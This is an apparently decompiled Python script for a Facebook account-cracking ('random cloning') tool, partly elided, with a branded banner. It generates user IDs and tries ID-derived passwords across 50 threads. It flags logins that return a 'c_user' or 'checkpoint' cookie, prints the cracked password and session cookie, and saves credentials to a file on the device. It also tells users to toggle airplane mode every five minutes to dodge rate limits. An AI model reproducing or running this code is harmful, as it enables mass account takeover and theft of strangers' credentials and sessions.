# Decompile by Mardis (Tools By Heron)
...
ha = current.day
today = date.today()
os.system('xdg-open https://facebook.com/100000901458099/')
logo = ("""
    
 \033[1;93m╔═════════════════[\033[1;32m 𝘼𝘿𝙈𝙄𝙉 𝙄𝙉-𝙁𝙍𝙊 \033[1;32m]══════════════╗
 \033[1;93m║     \033[1;96m[✓] CREATED BY\33[0;m   : \033[1;96m Heron Chowdhury  \033[1;32m║
 \033[1;93m║     \033[1;32m[✓] FACEBOK      : \033[1;34m Heron Chowdhury      \033[1;32m║
 \033[1;93m║     \033[1;35m[✓] GITHUB       :  \033[1;35mRiyad22750       \033[1;32m ║
 \033[1;93m║     \033[1;36m[✓] TOOL STATUS  : \033[1;36m 𝑹𝒂𝒏𝒅𝒐𝒎 𝑪𝒍𝒐𝒏𝒊𝒏𝒈       \033[1;32m ║
 \033[1;93m║     \033[1;35m[✓] TEAM         :  \033[1;32     Monstar \033[1;32m ║
 \033[1;93m║     \033[1;36m[✓] TOOL VIRSION :  \033[1;36m5.5                  \033[1;32m ║
 \033[1;93m║᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱ \033[1;32m║
 \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m ENJOY HERON TOOL...                 \033[1;32m  ║
 \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m HERON CHOWDHURY....          \033[1;32m ║
 \033[1;93m╚═════════════════[\033[1;93m HERON-CHOWDHURY\033[1;32m]══════════════╝""")
def linex():
	print('\033[1;93m ×××××××××××××××××××××××××××××××××××××××××××××××××')
loop = 0
oks = []
...
def riddu():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96m HERON CHOWDHURY')
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m USE NETWORK  \033[1;97m:  \033[1;96m2G, 3G, 4G, 5G ')
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;93m USE AEROPLANE MOOD IN EVERY 5 MIN ')
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Tool Work = wifi+Data ! ')
        print(f" \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××")
        for love in user:
            pwx = [love[1:]]
            uid = code+love
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[HERON-OK🍁] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/HERON-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;33m [login-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;95m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}HERON{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
